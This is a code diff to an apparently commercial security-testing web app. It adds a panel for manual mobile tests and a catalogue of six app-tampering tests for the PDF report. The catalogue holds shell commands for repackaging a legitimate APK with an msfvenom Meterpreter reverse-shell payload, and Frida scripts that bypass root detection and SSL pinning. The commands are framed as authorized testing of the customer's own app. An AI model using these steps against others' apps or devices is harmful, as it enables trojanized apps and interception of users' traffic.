@@ -5383,7 +5383,7 @@ function generateShellReport({title, icon, target, attacks, results}) {
 }
 
 // ── SHARED MODULE SHELL ──────────────────────────────────────
-function ModuleShell({title, icon, color, desc, token, apiUrl, attacks, extraInputs, bodyFn, moduleKey, reportFn}) {
+function ModuleShell({title, icon, color, desc, token, apiUrl, attacks, extraInputs, bodyFn, moduleKey, reportFn, belowPanel}) {
   const API = apiUrl || getApiUrl();
   const tok = token || getAuthToken();
   const [target, setTarget] = useState("");
@@ -5562,6 +5562,148 @@ function ModuleShell({title, icon, color, desc, token, apiUrl, attacks, extraInp
             );
           })}
         </div>
+
+        {/* Optional panel below the auto-scanner tiles (e.g. Manual Tests checklist) */}
+        {belowPanel && (
+          <div style={{marginTop:20}}>
+            {typeof belowPanel === "function" ? belowPanel() : belowPanel}
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+// ── MANUAL TESTS PANEL — renders a checklist of techniques the customer
+//    runs locally (Frida, Burp, etc.) with prereqs + step-by-step + evidence
+//    capture. State persisted to localStorage so re-opens preserve work.
+// ─────────────────────────────────────────────────────────────────
+function ManualTestsPanel({moduleKey, moduleLabel, tests}) {
+  const STORAGE_PREFIX = `vl_manual:${moduleKey}:`;
+  const [findings, setFindings] = React.useState(() => {
+    const out = {};
+    (tests || []).forEach(t => {
+      try {
+        const raw = localStorage.getItem(STORAGE_PREFIX + t.id);
+        if (raw) out[t.id] = JSON.parse(raw);
+      } catch(_){}
+    });
+    return out;
+  });
+  const [expanded, setExpanded] = React.useState({});
+
+  const update = (testId, patch) => {
+    setFindings(p => {
+      const next = {...p, [testId]: {...(p[testId]||{}), ...patch, updated_at: Date.now()}};
+      try { localStorage.setItem(STORAGE_PREFIX + testId, JSON.stringify(next[testId])); } catch(_){}
+      return next;
+    });
+  };
+
+  const completedCount = Object.values(findings).filter(f => f && f.status && f.status !== "not_run").length;
+  const totalCount = (tests || []).length;
+  const SEV_COLORS = {HIGH:"#ef4444", MEDIUM:"#f59e0b", LOW:"#22c55e", "no-finding":"#64748b"};
+
+  if (!tests || tests.length === 0) return null;
+
+  return (
+    <div style={{background:"#0a1628", border:"1px solid #1e3a5f", borderRadius:10, padding:16}}>
+      {/* Header */}
+      <div style={{display:"flex", alignItems:"center", justifyContent:"space-between", marginBottom:14, paddingBottom:10, borderBottom:"1px solid #1e3a5f"}}>
+        <div>
+          <div style={{fontSize:14, fontWeight:700, color:"#fbbf24", marginBottom:3}}>
+            🔧 Manual Tests — {moduleLabel}
+          </div>
+          <div style={{fontSize:11, color:"#94a3b8"}}>
+            These {totalCount} techniques cannot be fully automated. Run them locally — paste your findings below for the PDF report.
+          </div>
+        </div>
+        <div style={{fontSize:12, color:"#94a3b8"}}>
+          <span style={{color: completedCount===totalCount ? "#22c55e" : "#fbbf24", fontWeight:700}}>
+            {completedCount}/{totalCount}
+          </span> completed
+        </div>
+      </div>
+
+      {/* Cards */}
+      <div style={{display:"grid", gap:10}}>
+        {tests.map(t => {
+          const f = findings[t.id] || {};
+          const isOpen = !!expanded[t.id];
+          const status = f.status || "not_run";
+          const sev = f.severity || "no-finding";
+          const statusColor = status === "not_run" ? "#64748b" : SEV_COLORS[sev] || "#64748b";
+          return (
+            <div key={t.id} style={{background:"#0f172a", border:`1px solid ${isOpen ? "#3b82f6" : "#1e293b"}`, borderRadius:8, overflow:"hidden"}}>
+              {/* Card header (clickable to expand) */}
+              <div onClick={() => setExpanded(p => ({...p, [t.id]: !p[t.id]}))}
+                   style={{display:"flex", alignItems:"center", padding:"10px 14px", cursor:"pointer", gap:10, background: isOpen ? "#0d2138" : "transparent"}}>
+                <div style={{width:8, height:8, borderRadius:4, background: statusColor}}/>
+                <div style={{flex:1}}>
+                  <div style={{fontSize:13, fontWeight:600, color:"#e2e8f0"}}>{t.title}</div>
+                  <div style={{fontSize:10, color:"#64748b", marginTop:2}}>
+                    {t.ref} · Tools: {(t.tools_required||[]).join(", ")}
+                  </div>
+                </div>
+                {status !== "not_run" && (
+                  <span style={{background: statusColor, color:"#fff", padding:"2px 8px", borderRadius:4, fontSize:10, fontWeight:700, textTransform:"uppercase"}}>
+                    {sev === "no-finding" ? "OK" : sev}
+                  </span>
+                )}
+                <span style={{color:"#64748b", fontSize:12}}>{isOpen ? "▼" : "▶"}</span>
+              </div>
+
+              {/* Expanded body */}
+              {isOpen && (
+                <div style={{padding:"4px 14px 14px", borderTop:"1px solid #1e293b"}}>
+                  <div style={{display:"grid", gridTemplateColumns:"1fr 1fr", gap:14, marginTop:12}}>
+                    {/* Left: prereqs + steps */}
+                    <div>
+                      <div style={{fontSize:11, fontWeight:700, color:"#fbbf24", marginBottom:6, textTransform:"uppercase"}}>What customer needs</div>
+                      <ul style={{margin:0, paddingLeft:16, fontSize:11, color:"#cbd5e1", lineHeight:1.6}}>
+                        {(t.customer_prereqs||[]).map((p,i)=><li key={i}>{p}</li>)}
+                      </ul>
+                      <div style={{fontSize:11, fontWeight:700, color:"#fbbf24", marginTop:12, marginBottom:6, textTransform:"uppercase"}}>Steps</div>
+                      <ol style={{margin:0, paddingLeft:16, fontSize:11, color:"#cbd5e1", lineHeight:1.6}}>
+                        {(t.steps||[]).map((s,i)=>(
+                          <li key={i} style={{marginBottom:4}}>
+                            {s.startsWith("$") ? (
+                              <code style={{background:"#020617", color:"#4ade80", padding:"2px 6px", borderRadius:3, fontSize:10, fontFamily:"monospace"}}>{s.slice(1).trim()}</code>
+                            ) : s}
+                          </li>
+                        ))}
+                      </ol>
+                    </div>
+                    {/* Right: what to look for + evidence form */}
+                    <div>
+                      <div style={{fontSize:11, fontWeight:700, color:"#fbbf24", marginBottom:6, textTransform:"uppercase"}}>What to look for</div>
+                      <div style={{fontSize:11, color:"#cbd5e1", lineHeight:1.5, marginBottom:12, padding:8, background:"#020617", borderRadius:4, border:"1px solid #1e293b"}}>
+                        {t.what_to_look_for}
+                      </div>
+                      <div style={{fontSize:11, fontWeight:700, color:"#fbbf24", marginBottom:6, textTransform:"uppercase"}}>Your findings</div>
+                      <textarea value={f.evidence||""} onChange={e=>update(t.id, {evidence: e.target.value})}
+                                placeholder="Paste output / screenshot link / describe what happened..."
+                                style={{width:"100%", minHeight:80, background:"#020617", color:"#cbd5e1", border:"1px solid #334155", borderRadius:4, padding:"6px 8px", fontSize:11, fontFamily:"monospace", resize:"vertical", outline:"none", boxSizing:"border-box"}}/>
+                      <div style={{display:"flex", gap:6, marginTop:8, flexWrap:"wrap"}}>
+                        {[["not_run","Not Run","#64748b"],["no-finding","✓ No issue","#22c55e"],["LOW","Low","#22c55e"],["MEDIUM","Medium","#f59e0b"],["HIGH","High","#ef4444"]].map(([val,label,c])=>(
+                          <button key={val} onClick={()=>update(t.id, {status: val==="not_run"?"not_run":"done", severity: val==="not_run"?undefined:val})}
+                                  style={{background: (status==="not_run"?val==="not_run":f.severity===val)?c:"transparent", color: (status==="not_run"?val==="not_run":f.severity===val)?"#fff":c, border:`1px solid ${c}`, borderRadius:4, padding:"4px 10px", fontSize:10, fontWeight:700, cursor:"pointer"}}>
+                            {label}
+                          </button>
+                        ))}
+                      </div>
+                      {t.owasp_masvs && (
+                        <div style={{marginTop:8, fontSize:10, color:"#64748b"}}>
+                          MASVS: {t.owasp_masvs}
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                </div>
+              )}
+            </div>
+          );
+        })}
       </div>
     </div>
   );
@@ -6603,6 +6745,140 @@ function MobileModule({token, apiUrl}) {
 // ── MOBILE_STATIC — §1 APP BINARY (Static Analysis) ────────────────
 // Customer uploads APK/IPA/PE/ELF; 12 scanners analyze the binary.
 // Differs from MobileModule: file upload instead of domain target.
+// Manual mobile-static tests from mobile_ruff.md §1 (4 manual + 2 bridges).
+// Customer runs these locally with a connected device; results stored in
+// localStorage and rolled into the PDF report.
+const MANUAL_TESTS_MOBILE_STATIC = [
+  {
+    id: "smali_patch_resign",
+    ref: "§1 #8",
+    title: "Smali Patching → Resign → Reinstall",
+    tools_required: ["apktool", "jarsigner", "Android SDK / adb"],
+    customer_prereqs: [
+      "Android device or emulator with USB debugging on",
+      "Java JDK installed (for jarsigner + keytool)",
+      "A keystore (or create one: keytool -genkey -keystore my.jks)",
+      "The APK file you want to tamper-test",
+    ],
+    steps: [
+      "$ apktool d original.apk -o original_decoded",
+      "Edit a smali file under original_decoded/smali/ — e.g. change a hardcoded string or bypass an isLicensed() check",
+      "$ apktool b original_decoded -o patched.apk",
+      "$ jarsigner -keystore my.jks -storepass <pwd> patched.apk myalias",
+      "$ adb install -r patched.apk",
+      "Launch the app — see if your modification took effect",
+    ],
+    what_to_look_for: "If the patched APK installs AND your modification is active, the app has NO runtime integrity check. Critical for any app handling money, PII, or DRM. Look for: signature verification calls (PackageManager.GET_SIGNATURES), checksum-on-launch, or SafetyNet attestation.",
+    owasp_masvs: "MSTG-RESILIENCE-1, MSTG-RESILIENCE-2, MSTG-RESILIENCE-11",
+  },
+  {
+    id: "repackage_trojan",
+    ref: "§1 #9",
+    title: "Repackaging / Trojanizing a Legit APK",
+    tools_required: ["apktool", "jarsigner", "msfvenom (Metasploit)"],
+    customer_prereqs: [
+      "Test APK (preferably one of YOUR OWN builds, never a 3rd-party one)",
+      "Metasploit Framework installed (for the msfvenom payload generator)",
+      "Authorization to attempt repackaging on this app",
+    ],
+    steps: [
+      "$ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 R > payload.apk",
+      "$ apktool d original.apk -o original/ && apktool d payload.apk -o payload/",
+      "Copy payload/smali/com/metasploit/* into original/smali/com/metasploit/",
+      "Edit original/AndroidManifest.xml: add Meterpreter permissions + receiver",
+      "Edit the main launcher Activity's smali to invoke MainService",
+      "$ apktool b original/ -o trojanized.apk && jarsigner -keystore my.jks trojanized.apk myalias",
+      "$ adb install -r trojanized.apk and run Metasploit handler",
+    ],
+    what_to_look_for: "Did the trojanized APK install successfully? Does it run as the original app while also opening a reverse shell? If YES — your app has no anti-tamper. Also check: did Google Play Protect catch it on a real device?",
+    owasp_masvs: "MSTG-RESILIENCE-2, MSTG-RESILIENCE-11",
+  },
+  {
+    id: "resource_tampering",
+    ref: "§1 #10",
+    title: "Resource Tampering (strings, images, layouts)",
+    tools_required: ["apktool", "any text editor"],
+    customer_prereqs: [
+      "The APK file",
+      "apktool installed",
+    ],
+    steps: [
+      "$ apktool d app.apk -o app_decoded",
+      "Edit app_decoded/res/values/strings.xml — change a brand name, price, or terms-of-service URL",
+      "(Optional) replace app_decoded/res/drawable/icon.png with a different image",
+      "(Optional) edit a layout XML to hide a warning banner",
+      "$ apktool b app_decoded -o tampered.apk && resign with jarsigner",
+      "$ adb install -r tampered.apk — open the app",
+    ],
+    what_to_look_for: "Does the app load the tampered resources? A bank app showing a fake T&C URL is a phishing primitive. A pricing-display app showing wrong prices is fraud. Look for: resource integrity hashes, server-side rendering of critical UI, or assertions on R.string values at runtime.",
+    owasp_masvs: "MSTG-RESILIENCE-9, MSTG-PLATFORM-3",
+  },
+  {
+    id: "macho_elf_reverse",
+    ref: "§1 #13",
+    title: "Mach-O / ELF Reverse Engineering",
+    tools_required: ["Ghidra (free) or IDA Pro / Hopper", "file, otool, nm, objdump"],
+    customer_prereqs: [
+      "Native binary extracted from APK (lib/arm64-v8a/*.so) or IPA (app's Mach-O)",
+      "Ghidra installed (free from NSA) — or any disassembler",
+      "Patience: hours per binary",
+    ],
+    steps: [
+      "Extract the binary: $ unzip app.apk lib/arm64-v8a/libnative.so",
+      "$ file libnative.so   # confirm arch + dynamic",
+      "$ nm -D libnative.so | head   # list exported symbols",
+      "Open in Ghidra → analyze → look at function list",
+      "Search for strings: 'license', 'key', 'auth', 'server' — follow XREFs to find logic",
+      "Patch + LD_PRELOAD or use Frida.Interceptor to hook hot functions",
+    ],
+    what_to_look_for: "Hardcoded encryption keys in the .so, custom string-obfuscation that's trivially defeated, JNI bridge functions that bypass Java-side checks, anti-debug primitives like ptrace(PTRACE_TRACEME) you can NOP out. These findings prove an attacker can extract / bypass the native protections.",
+    owasp_masvs: "MSTG-RESILIENCE-1, MSTG-RESILIENCE-4, MSTG-CODE-9",
+  },
+  {
+    id: "frida_runtime_hook",
+    ref: "§2 #25 (bridge from binary → runtime)",
+    title: "Root-Detection Bypass via Frida",
+    tools_required: ["frida-server (on device)", "frida-tools (pip install)", "Rooted/jailbroken test device"],
+    customer_prereqs: [
+      "A test device — Magisk-rooted Android or jailbroken iOS",
+      "Frida-server matching your frida-tools version pushed to /data/local/tmp/",
+      "Your app's package name (e.g. com.yourcorp.yourapp)",
+    ],
+    steps: [
+      "$ adb push frida-server-16.x /data/local/tmp/ && adb shell chmod +x /data/local/tmp/frida-server",
+      "$ adb shell 'su -c /data/local/tmp/frida-server &'",
+      "$ pip install frida-tools && frida-ps -U   # verify device connection",
+      "Find a root-bypass script on https://codeshare.frida.re (search 'root bypass')",
+      "$ frida -U -f com.yourcorp.yourapp -l root-bypass.js --no-pause",
+      "Use the app — does it run as if not rooted?",
+    ],
+    what_to_look_for: "If Frida CodeShare scripts bypass your root detection in <5 min, the detection is just calling RootBeer or checking for /system/xbin/su. Real protection: SafetyNet/Play Integrity API attestation, multiple detection layers, periodic re-checks, server-side verification.",
+    owasp_masvs: "MSTG-RESILIENCE-1, MSTG-RESILIENCE-2",
+  },
+  {
+    id: "ssl_pinning_bypass",
+    ref: "§5 #56 (bridge from binary → network)",
+    title: "SSL Pinning Bypass via Frida",
+    tools_required: ["Frida + frida-server", "Burp Suite / mitmproxy"],
+    customer_prereqs: [
+      "Same device + Frida setup as the root-bypass test",
+      "Burp Suite installed on your laptop with its CA cert exported",
+      "Burp CA installed on the test device's user-CA store",
+      "Phone configured to use laptop's Burp proxy (Wi-Fi proxy settings)",
+    ],
+    steps: [
+      "Configure Burp to listen on 8080 on your laptop IP",
+      "On the device — Wi-Fi proxy → laptop_IP:8080",
+      "Without Frida — open your app. Does Burp see HTTPS traffic? If NO, pinning is active.",
+      "$ frida -U -f com.yourcorp.yourapp -l https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/ --no-pause",
+      "Open the app again — does Burp now see the requests?",
+    ],
+    what_to_look_for: "If the universal-ssl-bypass script defeats your pinning, you're only using OkHttp/Android's standard pinning. Stronger: implement pinning in native code (.so), verify via SafetyNet, use certificate transparency, or rotate pins via signed configuration.",
+    owasp_masvs: "MSTG-NETWORK-3, MSTG-NETWORK-4",
+  },
+];
+
+
 function MobileStaticModule({token, apiUrl}) {
   const [uploadedPath, setUploadedPath] = React.useState("");
   const [uploadStatus, setUploadStatus] = React.useState("");
@@ -6730,7 +7006,13 @@ function MobileStaticModule({token, apiUrl}) {
       target: uploadedPath || target || "uploaded binary",
       allResults: results || {},
       date: new Date().toLocaleString(),
-    })}/>;
+    })}
+    belowPanel={() => (
+      <ManualTestsPanel
+        moduleKey="mobile_static"
+        moduleLabel="Mobile App Binary Analysis"
+        tests={MANUAL_TESTS_MOBILE_STATIC}/>
+    )}/>;
 }
 
 
@@ -11401,6 +11683,51 @@ function generateOsintReport({target, allResults, date, authenticated, pdfConfig
     txt(row[0],margin+3,y+4.6,7.5,DARK,true);txt(row[1],margin+50,y+4.6,7,GRAY);y+=6.5;
   });y+=4;
 
+  // ── SECTION 15b: MANUAL VERIFICATION (customer self-tests) ─────
+  // Reads from localStorage entries written by ManualTestsPanel. Only
+  // included if the moduleConfig provides a manualLocalStorageKey + the
+  // test catalogue, so default OSINT generator stays untouched.
+  if (_MC.manualLocalStorageKey && Array.isArray(_MC.manualTests)) {
+    const _mStored = _MC.manualTests.map(t => {
+      try {
+        const raw = (typeof localStorage !== "undefined")
+          ? localStorage.getItem(`vl_manual:${_MC.manualLocalStorageKey}:${t.id}`)
+          : null;
+        return raw ? {...t, customer: JSON.parse(raw)} : {...t, customer: null};
+      } catch(_) { return {...t, customer: null}; }
+    });
+    const _mDone = _mStored.filter(t => t.customer && t.customer.status === "done").length;
+    chk(28); y = sHead("Manual Verification — Customer Self-Test", y);
+    fillR(margin, y, contentW, 9, [220,230,245]);
+    txt(`${_mDone} / ${_mStored.length} manual tests completed by the customer`,
+        margin+4, y+6, 8, BLUE, true);
+    y += 12;
+    _mStored.forEach((t, idx) => {
+      chk(20);
+      const c = t.customer || {};
+      const sc = c.status === "done"
+        ? (SEV[c.severity] || SEV.INFO)
+        : [148,163,184];
+      fillR(margin, y, contentW, 14, LIGHT);
+      fillR(margin, y, 3, 14, sc);
+      doc.setFillColor(...sc); doc.roundedRect(margin+5, y+2, 16, 4.5, 1, 1, "F");
+      txt(c.status === "done" ? (c.severity || "DONE") : "NOT RUN",
+          margin+6, y+5.3, 6.5, WHITE, true);
+      txt(`${t.ref || ""} ${t.title || ""}`.trim().substring(0,90),
+          margin+24, y+5, 8.5, DARK, true);
+      txt(`Tools: ${(t.tools_required||[]).join(", ").substring(0,90)}`,
+          margin+5, y+10, 6.5, GRAY);
+      y += 16;
+      if (c.evidence) {
+        chk(10);
+        const lines = doc.splitTextToSize("Customer evidence: " + String(c.evidence), contentW-8);
+        lines.slice(0,3).forEach(ln => { txt(ln, margin+5, y+3, 7, GRAY); y += 3.5; });
+        y += 4;
+      }
+    });
+    y += 4;
+  }
+
   // ── SECTION 16: APPENDIX ───────────────────────────────────────
   chk(40);y=sHead("Appendix",y);
   txt("A. Methodology",margin,y+5,9,DARK,true);y+=8;
@@ -11634,6 +11961,8 @@ function generateMobileStaticReport(opts) {
       "Apktool — https://apktool.org",
       "MobSF — https://mobsf.github.io/docs/"
     ],
+    manualLocalStorageKey: "mobile_static",
+    manualTests: MANUAL_TESTS_MOBILE_STATIC,
     recsBuilder: function(sevCount, r){
       const out=[];
       if(sevCount.CRITICAL>0)out.push("🔴 CRITICAL bytecode-malware correlation — submit binary to MalwareBazaar + revoke any signing key");
